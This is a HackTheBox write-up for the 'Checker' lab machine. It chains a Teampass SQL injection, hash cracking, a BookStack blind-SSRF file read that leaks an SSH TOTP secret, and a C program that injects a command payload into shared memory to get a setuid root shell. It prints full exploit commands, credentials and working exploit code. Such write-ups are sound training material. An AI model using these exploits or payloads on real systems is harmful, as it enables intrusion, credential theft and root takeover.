---
title:  "Checker (Hard)"
seo_title: "Writeup for the HackTheBox Checker Machine"
date:   2025-04-19T21:01
categories: ['HackTheBox', 'Linux']
---

![](/assets/images/headers/Checker.png)

# Synopsis
Checker is a hard-level Linux machine running Teampass and Bookstack on separate ports. The Teampass version has a SQL injection vulnerability [CVE-2023-1545](https://nvd.nist.gov/vuln/detail/CVE-2023-1545) that can be exploited to obtain user password hashes. By cracking these hashes, we get the password for the Teampass user `bob`. Logging into Teampass reveals credentials for both Bookstack user `bob` and the SSH user `reader`. Attempting SSH login as `reader` user shows that two-factor authentication is enabled. Meanwhile, the Bookstack version is vulnerable to [CVE-2023-6199](https://nvd.nist.gov/vuln/detail/CVE-2023-6199), a local file read flaw via Blind SSRF, which can be exploited to retrieve the 2FA secret key for the `reader` user’s SSH account, enabling successful SSH login. We reverse engineer a binary for privilege escalation to root to discover a command injection vulnerability, which we then exploit using a custom script.

## Reconnaissance
From our nmap scan we see three ports are open: 22, 80, 8080.

```
# Nmap 7.94SVN scan initiated Sat Feb 22 21:10:38 2025 as: nmap -v -sCV -oN checker.nmap 10.129.147.247
Nmap scan report for 10.129.147.247
Host is up (0.014s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 aa:54:07:41:98:b8:11:b0:78:45:f1:ca:8c:5a:94:2e (ECDSA)
|_  256 8f:2b:f3:22:1e:74:3b:ee:8b:40:17:6c:6c:b1:93:9c (ED25519)
80/tcp   open  http    Apache httpd
|_http-title: 403 Forbidden
|_http-server-header: Apache
8080/tcp open  http    Apache httpd
|_http-title: 403 Forbidden
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Foothold
The main website on port 80 redirects to `checker.htb` that makes use of BookStack, a simple, self-hosted, easy-to-use platform for organising and storing information.

On port 8080, a Teampass instance is running. Since we don't have any credentials yet, we start searching online for disclosed vulnerabilities. Searching for teampass on `https://security.sneak.io` shows several results, one of which is an [SQL injection vulnerability](https://security.snyk.io/vuln/SNYK-PHP-NILSTEAMPASSNETTEAMPASS-3367612) that allows us to retrieve two users from the Teampass database.

```console
s3rpent@OMEN:~$ ./teampass_sqli.sh checker.htb:8080
There are 2 users in the system:
admin: $2y$10$lKCae0EIUNj6f96ZnLqnC.LbWqrBQCT1LuHEFht6PmE4yH75rpWya
bob: $2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy
```

Only Bob's password is crackable with Hashcat.

```console
s3rpent@OMEN:~$ hashcat -m 3200 bob.hash $ROCKYOU
bob:cheerleader
```

## User
### Teampass

We can login to the Teampass instance by changing the time and using the credentials on `checker.htb:8080` that we found earlier. One of the buttons redirects us to `vault.checker.htb` so we can also add this to our `/etc/hosts` file. Clicking on the Password tab, we see two items for our user.

![](/assets/images/writeups/checker/teampass.png)

We can just click on the names of the items to open them.

![](/assets/images/writeups/checker/teampass1.png)

Clicking on the `eye` icon reveals the password of the BookStack login. The other (`ssh access`) also reveals SSH credentials for the user `reader`. This will probably be a user on the machine.

```
bob@checker.htb:mYSeCr3T_w1kI_P4sSw0rD
reader:hiccup-publicly-genesis
```

### BookStack

We can now login to the Bookstack website as `bob@checker.htb`. After logging in we see that the admin user has created some books and pages.

![](/assets/images/writeups/checker/bookstack.png)

We don't know the exact version of the website, but after searching around the web we can discover `CVE-2023-6199` which allows filtering local files on the server. This is possible because the application is vulnerable to SSRF. We can check if this site is vulnerable to the attack described by [Fluidattacks](https://fluidattacks.com/blog/lfr-via-blind-ssrf-book-stack/).

With writer permissions, we can create a book and create pages. Such pages accept Markdown and HTML code. We can intercept the `save draft` function with burpsuite. The blog post talks about using the [php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit) in order to read files on the server. The idea of this attack is the following:

1. Use the `iconv` filter with an encoding increasing the data size exponentially to trigger a memory error.
2. Use the `dechunk` filter to determine the first character of the file, based on the previous error.
3. Use the `iconv` filter again with encodings having different bytes ordering to swap remaining characters with the first one.

The Oracle exploit works with url encoded requests, but as we can see in BurpSuite we are sending JSON requests. In order to make the exploit work, we have to changed the `Content-Type` to `application/x-www-form-urlencoded`. We run the exploit as follows:

```console
s3rp3nt@OMEN:~$ python3 filters_chain_oracle_exploit.py --target 'http://checker.htb/ajax/page/10/save-draft' --file '/etc/passwd' --verb PUT --parameter html --headers '{"Content-Type":"application/x-www-form-urlencoded","X-CSRF-TOKEN":"L756lGhCCOxPAtJGbYnt2vWCqFP32qkPA1qZN9K7","Cookie":"XSRF-TOKEN=eyJpdiI6Inc0YTlpRjRaVUlGanNLNWxuMTlYVlE9PSIsInZhbHVlIjoiMCt6T2E0enRlb0tzWExoQVQ2TmQrd2JJQkVqTkt0eXV5Mkcxbm5qQjFyR0l3bXMvZ3RLczBudThKSWNKSWxaUU0xM3ZXSHI1RXJQSlk4cVZLMHRLbXJBL0Fjc09zSmZ4UWlNTFlYTmIyR0dXRGZnMUd6N2RaYmgvMlBxaTF0RVIiLCJtYWMiOiJlZWVjYjA2MzljODk1YTI4OGYwNGRlMThlMWVjZDUyMmY4NDVhYjI0ZGRhMWM0YjQwMGY1YTIyZTA5YzJiMTNmIiwidGFnIjoiIn0%3D; bookstack_session=eyJpdiI6ImU3dng4c2lFbWRpTHVFQzZEbklVbWc9PSIsInZhbHVlIjoiUWNPWGtJZWs3Ym1oUWZvVDhrdnZVWXNoUGIvcy9md0xjcW1qd2JtRDlvUjlINUdwQ2ExcmdBTmJRcnIrT2dsdDhFMXNSZWNaUUMvZFpKaGtnbXBBZXY2eWQ0K1hnNGlUZCtSRXhOWnVYc2UydWV3eFFmS2FSSkY4RXFEeGtOWUciLCJtYWMiOiI3ZGU0MWMwYTg5NDZiZWI1YzYzNGQxMzk1ZTI3ZDc1ZGE4ZGIyMWY5MGZkYmRmOGYwMGM2NWE1NzFiMzhlNmRlIiwidGFnIjoiIn0%3D; teampass_session=j7355s4vo14islb0n6e34usucu; jstree_select=1; 558fa9b1ffa04df378a1f2bb1a4cceed1e7cc9d4adbbfe21e2=071b2fcb9049e82b06036864832ea6a9364392df2c1fe3f364"}' --proxy http://localhost:8080
[*] The following URL is targeted : http://checker.htb/ajax/page/10/save-draft
[*] The following local file is leaked : /etc/passwd
[*] Running PUT requests
```

The above command fails with several errors about encoding problems. We redirect our request to BurpSuite with the `--proxy` argument and inspect the requests that are made.

![](/assets/images/writeups/checker/burp-oracle-wrong.png)

If we follow along with the video in the PoC, our `html` parameter has to be in the format of `<img=src='data:image/png;base64,<BASE64_PAYLOAD>' />`. We will have to make some modifications to the script. If we go to `filters_chain_oracle/core/requestor.py` we can modify line 108 to base64 encode our payload and add the required `img` tag.

![](/assets/images/writeups/checker/burp-oracle-changes.png)

We can now run the exploit script again and should be able to read files from the server. The correct request will look something like this:

![](/assets/images/writeups/checker/burp-oracle-right.png)

For instance we can verify the version of the BookStore application by targeting `../version` (version=v23.10.2).

```console
s3rp3nt@OMEN:~/php_filter_chains_oracle_exploit$ python3 filters_chain_oracle_exploit.py --target 'http://checker.htb/ajax/page/10/save-draft' --file '../version' --verb PUT --parameter html --headers '{"X-CSRF-TOKEN":"L756lGhCCOxPAtJGbYnt2vWCqFP32qkPA1qZN9K7","Content-Type":"application/x-www-form-urlencoded","Cookie":"XSRF-TOKEN=eyJpdiI6Inc0YTlpRjRaVUlGanNLNWxuMTlYVlE9PSIsInZhbHVlIjoiMCt6T2E0enRlb0tzWExoQVQ2TmQrd2JJQkVqTkt0eXV5Mkcxbm5qQjFyR0l3bXMvZ3RLczBudThKSWNKSWxaUU0xM3ZXSHI1RXJQSlk4cVZLMHRLbXJBL0Fjc09zSmZ4UWlNTFlYTmIyR0dXRGZnMUd6N2RaYmgvMlBxaTF0RVIiLCJtYWMiOiJlZWVjYjA2MzljODk1YTI4OGYwNGRlMThlMWVjZDUyMmY4NDVhYjI0ZGRhMWM0YjQwMGY1YTIyZTA5YzJiMTNmIiwidGFnIjoiIn0%3D; bookstack_session=eyJpdiI6ImU3dng4c2lFbWRpTHVFQzZEbklVbWc9PSIsInZhbHVlIjoiUWNPWGtJZWs3Ym1oUWZvVDhrdnZVWXNoUGIvcy9md0xjcW1qd2JtRDlvUjlINUdwQ2ExcmdBTmJRcnIrT2dsdDhFMXNSZWNaUUMvZFpKaGtnbXBBZXY2eWQ0K1hnNGlUZCtSRXhOWnVYc2UydWV3eFFmS2FSSkY4RXFEeGtOWUciLCJtYWMiOiI3ZGU0MWMwYTg5NDZiZWI1YzYzNGQxMzk1ZTI3ZDc1ZGE4ZGIyMWY5MGZkYmRmOGYwMGM2NWE1NzFiMzhlNmRlIiwidGFnIjoiIn0%3D; teampass_session=j7355s4vo14islb0n6e34usucu; jstree_select=1; 558fa9b1ffa04df378a1f2bb1a4cceed1e7cc9d4adbbfe21e2=071b2fcb9049e82b06036864832ea6a9364392df2c1fe3f364"}'
[*] The following URL is targeted : http://checker.htb/ajax/page/10/save-draft
[*] The following local file is leaked : ../version
[*] Running PUT requests
[+] File ../version leak is finished!
djIzLjEwLjIK
b'v23.10.2\n'
```

Since this process is very slow, we need to find good useful files to read on the server. I leaked the `/etc/passwd` with offset `1394` to get the users on the machine (but we alread knew `reader` was a user). I also tried to leak the `.env` file at the root of the application, but these credentials where not very useful.

```console
# /etc/passwd user
reader:x:1000:1000::/home/reader:/bin/bash

# .env file 
APP_KEY=base64:A+Io9TrHdEwh5pyUfh9KJmLEw6ujrMd5uXPaWB4TnLw=

DB_USERNAME=bookstack
DB_PASSWORD=pK8HK7IHCKLCNHUJ7
```

### MFA Token

We can login via SSH using the `reader` user and the password `hiccup-publicly-genesis`, but it asks for an OTP code. An [article](https://www.digitalocean.com/community/tutorials/how-to-set-up-multi-factor-authentication-for-ssh-on-ubuntu-16-04) on how to setup multi-factor authentication on SSH describes using `Google's PAM`. The section on `Recovering Access` it talks about a secret key in the user's home folder at `/home/<USER>/.google_authenticator`. This secret key can be manually type it into an TOTP app to get the rotating codes.

The problem is that we don't have access to the home folder of `reader`. After being stuck for a while, the admin user also posted a page about `basic-backup-with-cp` where it makes a copy of the user's home directory in `/backup/home_backup`. 

![](/assets/images/writeups/checker/bookstack-backups.png)

I tried to see if there was a backup of this user's home folder at `/backup/home_backup/home/reader` and here I was able to leak the `TOTP_AUTH` token.

```bash
s3rp3nt@OMEN:~/php_filter_chains_oracle_exploit$ python3 filters_chain_oracle_exploit.py --target 'http://checker.htb/ajax/page/10/save-draft' --file '/backup/home_backup/home/reader/.google_authenticator' --verb PUT --parameter html --headers '{"X-CSRF-TOKEN":"L756lGhCCOxPAtJGbYnt2vWCqFP32qkPA1qZN9K7","Content-Type":"application/x-www-form-urlencoded","Cookie":"XSRF-TOKEN=eyJpdiI6Inc0YTlpRjRaVUlGanNLNWxuMTlYVlE9PSIsInZhbHVlIjoiMCt6T2E0enRlb0tzWExoQVQ2TmQrd2JJQkVqTkt0eXV5Mkcxbm5qQjFyR0l3bXMvZ3RLczBudThKSWNKSWxaUU0xM3ZXSHI1RXJQSlk4cVZLMHRLbXJBL0Fjc09zSmZ4UWlNTFlYTmIyR0dXRGZnMUd6N2RaYmgvMlBxaTF0RVIiLCJtYWMiOiJlZWVjYjA2MzljODk1YTI4OGYwNGRlMThlMWVjZDUyMmY4NDVhYjI0ZGRhMWM0YjQwMGY1YTIyZTA5YzJiMTNmIiwidGFnIjoiIn0%3D; bookstack_session=eyJpdiI6ImU3dng4c2lFbWRpTHVFQzZEbklVbWc9PSIsInZhbHVlIjoiUWNPWGtJZWs3Ym1oUWZvVDhrdnZVWXNoUGIvcy9md0xjcW1qd2JtRDlvUjlINUdwQ2ExcmdBTmJRcnIrT2dsdDhFMXNSZWNaUUMvZFpKaGtnbXBBZXY2eWQ0K1hnNGlUZCtSRXhOWnVYc2UydWV3eFFmS2FSSkY4RXFEeGtOWUciLCJtYWMiOiI3ZGU0MWMwYTg5NDZiZWI1YzYzNGQxMzk1ZTI3ZDc1ZGE4ZGIyMWY5MGZkYmRmOGYwMGM2NWE1NzFiMzhlNmRlIiwidGFnIjoiIn0%3D; teampass_session=j7355s4vo14islb0n6e34usucu; jstree_select=1; 558fa9b1ffa04df378a1f2bb1a4cceed1e7cc9d4adbbfe21e2=071b2fcb9049e82b06036864832ea6a9364392df2c1fe3f364"}'
[*] The following URL is targeted : http://checker.htb/ajax/page/10/save-draft
[*] The following local file is leaked : /backup/home_backup/home/reader/.google_authenticator
[*] Running PUT requests
[+] File /backup/home_backup/home/reader/.google_authenticator leak is finished!
RFZEQlJBT0RMQ1dGN0kyT05BNEs1TFFMVUUKIiBUT1RQX0FVVEgK
b'DVDBRAODLCWF7I2ONA4K5LQLUE\n" TOTP_AUTH\n'
```

We can use this key on `https://totp.danhersam.com` to generate the token.

![](/assets/images/writeups/checker/totp-gen.png)

We can now login to the machine and get the user flag.

```console
s3rp3nt@OMEN:~$ ssh reader@checker.htb
(reader@checker.htb) Password: hiccup-publicly-genesis
(reader@checker.htb) Verification code:836829
reader@checker.htb:~$ cat user.txt
```

## Root
We are able to run `/opt/hash-checker/check-leak.sh *` as the root user.

```console
reader@checker.htb:~$ sudo /opt/hash-checker/check-leak.sh test
User not found in the database.
```

### Script analysis
We can try a few users and only `bob` makes the script run. 

```console
reader@checker.htb:~$ sudo /opt/hash-checker/check-leak.sh test
Password is leaked!
Using the shared memory 0xE5BD2 as temp location
User will be notified via bob@checker.htb
```

When executing the script, we run `pspy` in another shell.

```console
reader@checker.htb:~$ ./pspy64
2025/02/23 00:42:14 CMD: UID=0     PID=1      | /sbin/init
2025/02/23 00:42:16 CMD: UID=0     PID=42703  | sudo /opt/hash-checker/check-leak.sh bob
2025/02/23 00:42:16 CMD: UID=0     PID=42706  |
2025/02/23 00:42:16 CMD: UID=0     PID=42705  | /bin/bash /opt/hash-checker/check-leak.sh bob
2025/02/23 00:42:16 CMD: UID=0     PID=42704  | sudo /opt/hash-checker/check-leak.sh bob
2025/02/23 00:42:16 CMD: UID=0     PID=42708  | /bin/bash /opt/hash-checker/check-leak.sh bob
2025/02/23 00:42:16 CMD: UID=0     PID=42707  | /bin/bash /opt/hash-checker/check-leak.sh bob
2025/02/23 00:42:16 CMD: UID=0     PID=42709  |
2025/02/23 00:42:16 CMD: UID=0     PID=42710  |
2025/02/23 00:42:17 CMD: UID=0     PID=42712  | sh -c mysql -u teampass_user -D teampass -s -N -e 'select email from teampass_users where pw = "$2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy"'
2025/02/23 00:42:17 CMD: UID=0     PID=42713  | mysql -u teampass_user -D teampass -s -N -e select email from teampass_users where pw = "$2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy"
```

### Command Injection
The binary runs a shell command that is vulnerable to command injection if we are able to alter the `pw` value. We first need to see what the contents of the shared memory is. I asked ChatGPT how we can read from a shared memory location, and it gave me a small C script to start with.

***Prompt:** How can you read from a shared memory location on Linux based on the key?*

```c
#include <stdio.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <string.h>
#include <unistd.h>

#define SHM_KEY 1234  // The shared memory key
#define SHM_SIZE 1024  // Size of the shared memory segment

int main() {
    // Step 1: Get shared memory segment ID
    int shmid = shmget(SHM_KEY, SHM_SIZE, 0666);  // 0666 grants read and write permission

    if (shmid == -1) {
        perror("shmget failed");
        return 1;
    }

    // Step 2: Attach the shared memory segment to our address space
    void *shm_ptr = shmat(shmid, NULL, 0);  // Attach at any available location

    if (shm_ptr == (void *)-1) {
        perror("shmat failed");
        return 1;
    }

    // Step 3: Read from the shared memory
    printf("Reading from shared memory: %s\n", (char *)shm_ptr);

    // Step 4: Detach the shared memory segment when done
    if (shmdt(shm_ptr) == -1) {
        perror("shmdt failed");
        return 1;
    }

    return 0;
}
```

For this script to work, you would need to know the `SHM_KEY` value, but this is not a fixed location. We will do the following modifications:
1. Randomly generate key values and run the script in a loop
2. When the shared memory location is not empty, print the contents and break out of the loop

```c
#include <stdio.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <stdlib.h>

#define SHM_SIZE 1024  // Size of the shared memory segment

int main() {
    printf("Brute forcing shared memory addresses...\n");
    while (1) {
        // Step 0: generate random key
        time_t current_time = time(NULL);
        srand((unsigned int)current_time);
        int random = rand();
        key_t SHM_KEY = random % 0xfffff;

        // Step 1: Get shared memory segment ID
        // IPC_CREAT will create the segment if it does not exist.
        int shmid = shmget(SHM_KEY, SHM_SIZE, IPC_CREAT | 0666);  // 0666 grants read and write permission

        if (shmid == -1) {
            perror("shmget failed");
            return 1;
        }

        // Step 2: Attach the shared memory segment to our address space
        char *shm_addr = (char *)shmat(shmid, NULL, 0);  // Attach at any available location

        if (shm_addr == (char *)-1) {
            perror("shmat failed");
            return 1;
        }

        // Check if memory segment is not empty
        if (shm_addr[0] != '\0') {
            // Step 3: Read from the shared memory
            printf("[+] Got a hit at key: 0x%lx\n", (unsigned long)SHM_KEY);
            printf("[+] Reading content: %s\n", shm_addr);

            // Step 4: Detach the shared memory segment when done
            if (shmdt(shm_addr) == -1) {
                perror("shmdt failed");
                return 1;
            }
            break;
        }
    }
    return 0;
}
```

We compile and run the script and then run the `check-leak.sh` command as root in another shell.

```console
reader@checker.htb:~$ gcc -o leak leak.c
reader@checker.htb:~$ ./leak 
Brute forcing shared memory addresses...
[+] Got a hit at key: 0x8117c
[+] Reading content: Leaked hash detected at Sun Feb 23 15:36:21 2025 > $2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy

reader@checker:~$ sudo /opt/hash-checker/check-leak.sh bob
Password is leaked!
Using the shared memory 0x8117C as temp location
User will be notified via bob@checker.htb
```

The leaked memory contains the password of bob, as we expected. So in order to exploit this we need to overwrite the shared memory location (replace the password hash with injection payload). We can see that the password hash is captured after the `>` sign, so this is the place where we can place our command injection payload. Our final exploit will copy `/bin/bash` to `/tmp` and add the `setuid` bit to it.


```c
#include <stdio.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <stdlib.h>

#define SHM_SIZE 1024  // Size of the shared memory segment

int main() {
    printf("Brute forcing shared memory addresses...\n");
    while (1) {
        // Step 0: generate random key
        time_t current_time = time(NULL);
        srand((unsigned int)current_time);
        int random = rand();
        key_t SHM_KEY = random % 0xfffff;

        // Step 1: Get shared memory segment ID
        // IPC_CREAT will create the segment if it does not exist.
        int shmid = shmget(SHM_KEY, SHM_SIZE, IPC_CREAT | 0666);  // 0666 grants read and write permission

        if (shmid == -1) {
            perror("shmget failed");
            return 1;
        }

        // Step 2: Attach the shared memory segment to our address space
        char *shm_addr = (char *)shmat(shmid, NULL, 0);  // Attach at any available location

        if (shm_addr == (char *)-1) {
            perror("shmat failed");
            return 1;
        }

        // Check if memory segment is not empty
        if (shm_addr[0] != '\0') {
            // Step 3: Read from the shared memory
            printf("[+] Got a hit at key: 0x%lx\n", (unsigned long)SHM_KEY);
            printf("[+] Reading content: %s\n", shm_addr);

            // Step 4: Write the payload to the shared memory segment.
            const char *payload = "Leaked hash detected at Sun Feb 23 xx:xx:xx 2025 > ';cp /bin/bash /tmp/bash; chmod u+s /tmp/bash ;#";
            snprintf(shm_addr, SHM_SIZE, "%s", payload);

            printf("[+] Payload injected into shared memory! Detaching memory...\n");

            // Step 5: Detach the shared memory segment when done
            if (shmdt(shm_addr) == -1) {
                perror("shmdt failed");
                return 1;
            }
            break;
        }
    }
    return 0;
}
```

Lets compile and run it again.

```console
reader@checker:~$ gcc -o leak leak.c
reader@checker:~$ ./leak
Brute forcing shared memory addresses...

reader@checker:~$ sudo /opt/hash-checker/check-leak.sh bob
Password is leaked!
Using the shared memory 0x33C30 as temp location
ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"' at line 1
Failed to read result from the db

reader@checker:/tmp$ ls -la | grep bash
-rwsr-xr-x  1 root root 1396520 Feb 23 15:53 bash
```

The exploit worked and now we can get the root flag.

```console
reader@checker:/tmp$ /tmp/bash -p
bash-5.1# cat /root/root.txt
```